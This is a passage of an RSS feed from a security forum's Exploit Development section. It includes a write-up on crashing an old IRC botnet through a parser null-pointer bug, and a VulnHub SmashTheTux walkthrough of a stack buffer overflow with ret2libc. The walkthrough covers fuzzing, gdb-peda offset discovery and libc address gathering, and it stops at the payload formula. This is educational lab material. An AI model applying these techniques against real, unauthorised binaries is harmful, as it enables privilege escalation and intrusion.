          <source url="https://0x00sec.org/t/anti-virus-exploitation-local-privilege-escalation-in-k7-security-cve-2019-16897/17655.rss">Anti-virus Exploitation: Local Privilege Escalation in K7 Security (CVE-2019-16897)</source>
        </item>
        <item>
          <title>Exploit Reporting Guidelines</title>
          <dc:creator><![CDATA[127.0.0.1]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Exploit development to me seems like a world without rules and guidelines. Any one can do what ever he or she wants to do. When I look at exploitdb it seems there are no guide lines for exploits being development for software application.</p>
<p>Any there are guideline for reporting exploits if you find them?</p>
            <p><small>8 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/exploit-reporting-guidelines/17034">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/exploit-reporting-guidelines/17034</link>
          <pubDate>Sat, 19 Oct 2019 15:20:03 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-17034</guid>
          <source url="https://0x00sec.org/t/exploit-reporting-guidelines/17034.rss">Exploit Reporting Guidelines</source>
        </item>
        <item>
          <title>Crashing Hackarmy Botnet</title>
          <dc:creator><![CDATA[hunter]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Hello all!</p>
<p>I’ve been away for a while. Yet I’m here with a new story for you!<br>
This is a short story of me encountering a vulnerability while analyzing a malware. I hope you will enjoy it <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<p>If you have read the black covered “Secrets of Reverse Engineering” you may remember Hackarmy botnet client. Its a really old IRC botnet malware from 2009. I was supposed to analyse it during an assesment I have entered. Questions were relatively trivial like; “What’s the c2 this malware connects to?” and such. But while I was inspecting its code, something caught my attention in its IRC command parser.</p>
<p>This malware connects to an IRC server which is hardcoded inside it. Joins a specific channel. Then starts waiting to receive commands through <strong>private message</strong>.<br>
Normally, it expects a specific password value to be sent before starting to process anything. This prevents unauthorized execution of a command.<br>
However this vulnerability is directly in a part which is parsing “PRIVMSG” command of IRC. So crashing this malware doesn’t require any knowledge of password beforehand. Yay! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=12" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<p>Take a look at the following snippet<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/098dcb2295ed448fb0661de27ff7d041dac9041b.png" data-download-href="/uploads/short-url/1mw5tO09j5sQpDLnUSBs5xRi391.png?dl=1" title="resim"><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/098dcb2295ed448fb0661de27ff7d041dac9041b.png" alt="resim" data-base62-sha1="1mw5tO09j5sQpDLnUSBs5xRi391" width="690" height="473"></a></div><p></p>
<p>When malware receives a data over the network:</p>
<ol>
<li>It first compares first 7 bytes to “PRIVMSG” to see if it has received an irc private message.</li>
<li>If its indeed a private message it searches the string " :" (without quotes) and retrieves the beginning address of first occurence.</li>
</ol>
<p>Now lets take a look at what a PRIVMSG command looks like.</p>
<blockquote>
<p>PRIVMSG Wiz :Hello are you receiving this message ?</p>
</blockquote>
<p>So according to search operation above now you got;</p>
<ul>
<li>" :Hello are you receiving this message?"</li>
</ul>
<p>Afterward it calculates <em>address_of_first_occurence + 2</em>, namely the location which actual body of the message begins. It then proceed to read the first byte and compare it to char ‘!’ (some commands this malware receive start with exclamation mark).</p>
<p>Here the malware assumes PRIVMSG commands will indeed contain a space and column. I went on to try to send one without it and see what will happen. As I suspected the IRC server redirected the private message nonetheless. And since malware couldn’t parse it properly it crashed.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/3e86852ead1206c91475236cba06d4cb0f35e9bd.png" data-download-href="/uploads/short-url/8V7OjfHEutv01TkDT25IjLL1Stn.png?dl=1" title="resim"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3e86852ead1206c91475236cba06d4cb0f35e9bd.png" alt="resim" data-base62-sha1="8V7OjfHEutv01TkDT25IjLL1Stn" width="690" height="312"></a></div><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/f/faf1db322af4fffe8708f2d7828736aad301c6a2.png" alt="resim" data-base62-sha1="zNXxCetCT7fVLnMPOsnjuEWrAX0" width="484" height="146"><p></p>
<p>But what happened exactly? By definition, the function <em>strstr()</em> returns <em>zero</em> if no occurences found.<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/305d2f8e292d4849b39742be27511e79f20c9473.png" data-download-href="/uploads/short-url/6TQzdZW7uqnR39XXJsje00FLdK3.png?dl=1" title="resim"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/305d2f8e292d4849b39742be27511e79f20c9473.png" alt="resim" data-base62-sha1="6TQzdZW7uqnR39XXJsje00FLdK3" width="690" height="64"></a></div><p></p>
<p>Afterward the malware tried to calculate beginning of message body: <em>address_of_first_occurence+2</em> which is actually <em>0+2</em> since <em>strstr()</em> returned a null pointer. Then it tried to read from address <strong>0x2</strong>. Since this address is reserved for kernel it is inaccessible by a userland application. Operating system noticed this read attempt and <strong>crashed</strong> the application as a way of telling it to mind its own damn business <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=12" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<p>So this was the vulnerability I found. No need to say that I have passed the assessment <img src="https://0x00sec.org/images/emoji/twitter/joy.png?v=12" title=":joy:" class="emoji" alt=":joy:" loading="lazy" width="20" height="20"><br>
You may watch the video below if you would like to see a live demonstration!</p>
<p><a href="https://www.youtube.com/watch?v=952tJ8oDlgE">burnit4</a></p>

<p>I hope you enjoyed this thread see you in the next one <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/crashing-hackarmy-botnet/16738">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/crashing-hackarmy-botnet/16738</link>
          <pubDate>Sun, 06 Oct 2019 17:02:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-16738</guid>
          <source url="https://0x00sec.org/t/crashing-hackarmy-botnet/16738.rss">Crashing Hackarmy Botnet</source>
        </item>
        <item>
          <title>[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</title>
          <dc:creator><![CDATA[petruknisme]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>SmasTheTux is Vulnerable VM hosted by <a href="https://vulnhub.com" rel="noopener nofollow ugc">VulnHub</a> and created by <a href="https://canyoupwn.me/smashthetux-vm/" rel="noopener nofollow ugc">CanYouPwnMe</a></p>
<h4>Disclaimer</h4>
<p>This is for educational purpose and I will try to explain this tutorial with beginner-friendly explanation as I can.</p>
<p>SmashTheTux is a new VM made by <a href="http://canyoupwn.me" rel="noopener nofollow ugc">canyoupwn.me</a> for those who wants to take a step into the world of binary exploitation. This VM consists of 9 challenges, each introducing a different type of vulnerability. SmashTheTux covers basic exploitation of the following weaknesses:</p>
<ul>
<li>Stack Overflow Vulnerability</li>
<li>Off-by-One Vulnerability</li>
<li>Integer Overflow</li>
<li>Format String Vulnerability</li>
<li>Race Conditions</li>
<li>File Access Weaknesses</li>
<li>Heap Overflow Vulnerability</li>
</ul>
<p>VM Description:</p>
<pre><code class="lang-auto">Name........: SmashTheTux: 1.0.1
Date Release: 1 Apr 2016
Author......: CanYouPwn.Me
Series......: SmashTheTux
Objective...: Leveling up from user
Tester(s)...: h1tch1
Twitter.....: https://twitter.com/D4rk36
Credential..: tux:tux,root:1N33dP0w3r
Filename....: SmashTheTux_v1.0.1.7z
File size...: 616 MB
MD5.........: 63FEDA288163D9155B1BF84D1C6C2814
SHA1........: 01DCB1AB85B139A386AD97B41190731509612F59

</code></pre>
<p>Download link: <a href="https://www.vulnhub.com/entry/smashthetux-101,138/" rel="noopener nofollow ugc">https://www.vulnhub.com/entry/smashthetux-101,138/</a></p>
<p><strong>Summary</strong></p>
<p>In this first series, I will cover two topic:</p>
<ul>
<li>Bypassing NX using ret2libc</li>
<li>Exploiting with execstack enable</li>
</ul>
<h4><strong>Initial Setup</strong></h4>
<p>Login to SmasTheTux VM using Virtualbox, VMWare or other virtualization clients with the above credentials and then get the IP address from that for easy access:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f43e2a1a62a65e1fb7e4e81899fc8bd388347fcc.png" alt="tux-login" data-base62-sha1="yQFGKB7w4GU2wfE8tMsD8SABLWI" width="690" height="180"></p>
<h4><strong>SSH</strong></h4>
<p>We will use ssh for remoting the VM because it’s easy to use rather than debugging in the VM without scroll function, copy paste and other function.</p>
<pre><code class="lang-bash">ssh tux@192.168.2.125
The authenticity of host '192.168.2.125 (192.168.2.125)' can't be established.
ECDSA key fingerprint is SHA256:f/.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.125' (ECDSA) to the list of known hosts.
                            _    _            _._ 
                          .|_|_,' |          /_ _`. 
                          |       |          (.X.)| 
                          `|`'`-._|          |\_/'| 
                           | |               )____`\ 
                           | |              //_V _\ \ 
                           | |             ((  |  `(_) 
                           | |            / \&gt; '   / \ 
                           | |            \  \.__./  / 
                           | |             `-'    `-' 
                           | |
                          |` |
                          `--'
         __                     _    _____ _         _____            
        / _\_ __ ___   __ _ ___| |__/__   \ |__   __/__   \_   ___  __
        \ \| '_ ` _ \ / _` / __| '_ \ / /\/ '_ \ / _ \/ /\/ | | \ \/ /
        _\ \ | | | | | (_| \__ \ | | / /  | | | |  __/ /  | |_| |&gt;  &lt; 
        \__/_| |_| |_|\__,_|___/_| |_\/   |_| |_|\___\/    \__,_/_/\_\
                                                                      
                                                by canyoupwn.me

tux@192.168.2.125's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Jul  8 10:10:30 2019
tux@tux:~$ 

</code></pre>
<p>After successful login, we can see a list of files and tutorials for completing these challenges:</p>
<pre><code class="lang-bash">tux@tux:~$ ls -al
total 288
drwxr-xr-x 12 tux  tux   4096 Mar 12  2016 .
drwxr-xr-x  3 root root  4096 Mar 11  2016 ..
drwxr-xr-x  2 tux  tux   4096 Mar 11  2016 0x00
drwxr-xr-x  2 tux  tux   4096 Mar 11  2016 0x01
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x02
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x03
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x04
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x05
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x06
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x07
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x08
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x09
lrwxrwxrwx  1 tux  tux      9 Mar 11  2016 .bash_history -&gt; /dev/null
-rw-r--r--  1 tux  tux    220 Mar 11  2016 .bash_logout
-rw-r--r--  1 tux  tux   3545 Mar 11  2016 .bashrc
lrwxrwxrwx  1 tux  tux      9 Mar 11  2016 .nano_history -&gt; /dev/null
-rw-r--r--  1 tux  tux    675 Mar 11  2016 .profile
-rw-r--r--  1 tux  tux    679 Mar 12  2016 README
-rw-r--r--  1 tux  tux  20871 Mar 12  2016 TUTORIAL_formatstring
-rw-r--r--  1 tux  tux  91044 Mar 11  2016 TUTORIAL_heapoverflow
-rw-r--r--  1 tux  tux  27657 Mar 11  2016 TUTORIAL_integerbugs
-rw-r--r--  1 tux  tux  18657 Mar 11  2016 TUTORIAL_offbyone
-rw-r--r--  1 tux  tux  60996 Mar 11  2016 TUTORIAL_stackoverflow
</code></pre>
<p>For someone who have experienced with <a href="https://exploit.education/protostar/" rel="noopener nofollow ugc">Protostar</a>, this machine challenges is identical with that.</p>
<h4><strong>Level 0x00</strong></h4>
<p>We have binary file with the source code available:</p>
<pre><code class="lang-auto">// gcc pwnme.c -o pwnme -fno-stack-protector
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void vuln( char * arg ) {
        char buf[256];
        strcpy(buf, arg);
}

int main(int argc, char **argv) {
        printf("Val: %s\n", argv[1]);
        vuln(argv[1]);

        return 0;
}
</code></pre>
<p>The above code consist of vulnerable function:</p>
<ul>
<li>
<code>main()</code> function take the input as <code>argv[1]</code> and the pass the value to <code>vuln()</code> function</li>
<li>
<code>char buf[256]; </code>define the buf variable with 256 bytes in length.</li>
<li>
<code>strcpy(buf, arg);</code> copying buffer from <code>main()</code> to <code>arg</code> variable</li>
</ul>
<p>We know that <code>strcpy(3)</code> is a very unsafe function call in the C library and we should use <code>strlcpy(3)</code> or <code>snprintf</code>instead.</p>
<p>Why? Because by default no check for the size of data that will fit in the local buffer and blindly copies the data.</p>
<p><strong>Fuzzing</strong></p>
<p>We know that maximum length is 256 bytes for the user input defined before. We can use little python script for fuzzing the input in case we don’t know the offset address:</p>
<pre><code class="lang-python"># tux@tux:~/0x00$ cat fuzz.py
import os

buffer=["A"]
counter=100

while len(buffer) &lt;= 30:
    buffer.append("A" * counter)
    counter=counter+100

for string in buffer:
    print("Fuzzing %s bytes" % len(string))
    os.system("./pwnme %s" % string) 
</code></pre>
<p>Explanation:</p>
<ul>
<li>Define first buffer as 100 bytes and then increase by 100 bytes per loop</li>
<li>Copy buffer to program parameter as an argument</li>
</ul>
<p>It will show this result:</p>
<pre><code class="lang-bash">tux@tux:~/0x00$ python fuzz.py 
Fuzzing 1 bytes
Val: A
Fuzzing 100 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Fuzzing 200 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Fuzzing 300 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
Fuzzing 400 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
Fuzzing 500 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault

------- long result cut ----------
</code></pre>
<p>From the above result, the program starting to crash/segmentation fault when we use 300 bytes as the input parameter. But what number exactly trigger that segfault? How to find the missing one? Let’s use gdb-peda for doing this job. I will prefer gdb-peda instead of gdb for easy to use and more friendly.</p>
<p><strong>Install Gdb-Peda</strong></p>
<p>Don’t forget to check if gdb is existed in the machine before using gdb-peda.</p>
<pre><code class="lang-bash">tux@tux:~/0x00$ gdb -v
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i586-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type "help".
Type "apropos word" to search for commands related to "word".
</code></pre>
<p>Because of a limited package in the remote machine, we need to download gdb-peda in local and then copy to the server using SCP or FTP.</p>
<pre><code class="lang-auto"># in host machine
git clone https://github.com/longld/peda.git /home/user/peda
scp -r /home/user/peda tux@192.168.2.125:/home/tux

# from the tux machine
echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
</code></pre>
<p>We can check if peda is successfully installed with just running the gdb and see the result:</p>
<pre><code class="lang-bash">tux@tux:~/0x00$ gdb ./pwnme 
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i586-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./pwnme...(no debugging symbols found)...done.
gdb-peda$ 
</code></pre>
<p>Nah, we have <code>gdb-peda</code> installed. Let’s do some check for binary security of that file. This is the first thing that I would do when starting Linux binary exploitation:</p>
<pre><code class="lang-bash">gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre>
<p>Hm… NX is enabled. So, what this means is that we can’t execute our payload/shellcode in stack address because of NX(Non-Executable stack) prevention. Since the processor is not allowed to execute instructions placed on the stack.</p>
<p>In order to bypass this mechanism, We can use <code>ret2lib</code>(return to libc or return to the C library) technique. In the simple definition, this attack doesn’t require any shellcode to take control of the target vulnerable process because we can invoke classic built-in functions such as “system, exit, etc”.</p>
<p>For more information about ret2libc, you can look at <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> explanation <a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833" class="inline-onebox">Exploiting Techniques \000 - ret2libc</a></p>
<p><strong>Finding Patterns</strong></p>
<p>As we know that our program crash when using 300 bytes as input parameter, this is will be our clue for creating a pattern and finding the right offset with gdb-peda.</p>
<pre><code class="lang-bash">gdb-peda$ pattern create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
</code></pre>
<pre><code class="lang-bash">gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
Starting program: /home/tux/0x00/pwnme 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
Val: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff4b0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
EBX: 0xbffff5f0 --&gt; 0x2 
ECX: 0xbffff8e0 ("A%5A%KA%gA%6A%")
EDX: 0xbffff5ce ("A%5A%KA%gA%6A%")
ESI: 0x0 
EDI: 0x0 
EBP: 0x64254148 ('HA%d')
ESP: 0xbffff5c0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
EIP: 0x41332541 ('A%3A')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41332541
[------------------------------------stack-------------------------------------]
0000| 0xbffff5c0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0004| 0xbffff5c4 ("eA%4A%JA%fA%5A%KA%gA%6A%")
0008| 0xbffff5c8 ("A%JA%fA%5A%KA%gA%6A%")
0012| 0xbffff5cc ("%fA%5A%KA%gA%6A%")
0016| 0xbffff5d0 ("5A%KA%gA%6A%")
0020| 0xbffff5d4 ("A%gA%6A%")
0024| 0xbffff5d8 ("%6A%")
0028| 0xbffff5dc --&gt; 0xb7e3fa00 (&lt;__libc_start_main+144&gt;:       mov    esi,DWORD PTR [eax+0x1d0])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41332541 i
</code></pre>
<p>Aha! We got a signal from our Lord with SIGSEGV(Segmentation Fault). From my experience, this is a possible signal to overflow the buffer. We get the offset at the end of result <code>0x41332541</code>.</p>
<p>We can check information register for EIP, EBP, ESP:</p>
<pre><code class="lang-bash">gdb-peda$  i r eip esp ebp
eip            0x41332541       0x41332541
esp            0xbffff5c0       0xbffff5c0
ebp            0x64254148       0x64254148
</code></pre>
<p>What’s next? checking the correct offset address:</p>
<pre><code class="lang-bash">gdb-peda$ pattern offset 0x41332541
1093870913 found at offset: 268
</code></pre>
<p>Now, this is what we got so far:</p>
<ul>
<li>EIP Offset 0x41332541</li>
<li>Offset Number 268</li>
<li>NX Enabled.</li>
</ul>
<p><strong>Exploiting with NX Enabled</strong></p>
<p>First, We need to check if ASLR is enabled or not</p>
<pre><code class="lang-auto">$ cat /proc/sys/kernel/randomize_va_space
0
</code></pre>
<p>Good, ASLR is disabled for this machine. So, it will be easy for us because the address space value is not dynamically changed.</p>
<pre><code class="lang-auto">tux@tux:~/0x00$ ldd pwnme
        linux-gate.so.1 (0xb7ffd000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
        /lib/ld-linux.so.2 (0x80000000)
tux@tux:~/0x00$ ldd pwnme
        linux-gate.so.1 (0xb7ffd000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
        /lib/ld-linux.so.2 (0x80000000)
tux@tux:~/0x00$ ldd pwnme
        linux-gate.so.1 (0xb7ffd000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
        /lib/ld-linux.so.2 (0x80000000)
</code></pre>
<p>As we can see “libc” address is the same every time we check with ldd.</p>
<p><strong>Finding Functions Address</strong></p>
<p>For this purpose, We only need <code>system()</code>, <code>/bin/sh</code>, and <code>exit()</code> function. We will use system function and passing a shell as an argument and then invoke the exit function in order to terminate our system call. Start the program first.</p>
<pre><code class="lang-bash">gdb-peda$ start
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0xb7fcf000 --&gt; 0x1a8da8 
ECX: 0xbffff730 --&gt; 0x1 
EDX: 0xbffff754 --&gt; 0xb7fcf000 --&gt; 0x1a8da8 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff718 --&gt; 0x0 
ESP: 0xbffff710 --&gt; 0xbffff730 --&gt; 0x1 
EIP: 0x804845a (&lt;main+15&gt;:      mov    ebx,ecx)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048456 &lt;main+11&gt;: mov    ebp,esp
   0x8048458 &lt;main+13&gt;: push   ebx
   0x8048459 &lt;main+14&gt;: push   ecx
=&gt; 0x804845a &lt;main+15&gt;: mov    ebx,ecx
   0x804845c &lt;main+17&gt;: mov    eax,DWORD PTR [ebx+0x4]
   0x804845f &lt;main+20&gt;: add    eax,0x4
   0x8048462 &lt;main+23&gt;: mov    eax,DWORD PTR [eax]
   0x8048464 &lt;main+25&gt;: sub    esp,0x8
[------------------------------------stack-------------------------------------]
0000| 0xbffff710 --&gt; 0xbffff730 --&gt; 0x1 
0004| 0xbffff714 --&gt; 0xb7fcf000 --&gt; 0x1a8da8 
0008| 0xbffff718 --&gt; 0x0 
0012| 0xbffff71c --&gt; 0xb7e3fa63 (&lt;__libc_start_main+243&gt;:       mov    DWORD PTR [esp],eax)
0016| 0xbffff720 --&gt; 0x80484a0 (&lt;__libc_csu_init&gt;:      push   ebp)
0020| 0xbffff724 --&gt; 0x0 
0024| 0xbffff728 --&gt; 0x0 
0028| 0xbffff72c --&gt; 0xb7e3fa63 (&lt;__libc_start_main+243&gt;:       mov    DWORD PTR [esp],eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x0804845a in main ()
</code></pre>
<p>After that, we can find the address we need.</p>
<pre><code class="lang-auto">gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f85a69 ("/bin/sh")
gdb-peda$ p &amp;exit
$1 = (&lt;text variable, no debug info&gt; *) 0xb7e571b0 &lt;__GI_exit&gt;
gdb-peda$ p &amp;system
$2 = (&lt;text variable, no debug info&gt; *) 0xb7e643e0 &lt;__libc_system&gt;
</code></pre>
<p>Explanation:</p>
<ul>
<li>system() address is 0xb7e643e0</li>
<li>exit() address is 0xb7e571b0</li>
<li>/bin/sh address 0xb7f85a69</li>
</ul>
<p><strong>Creating Payload</strong></p>
<p>We can use this formula from the information we gathered before:</p>
<blockquote>
<p>Bytes Offset + System Address + Exit Address + Shell Address</p>
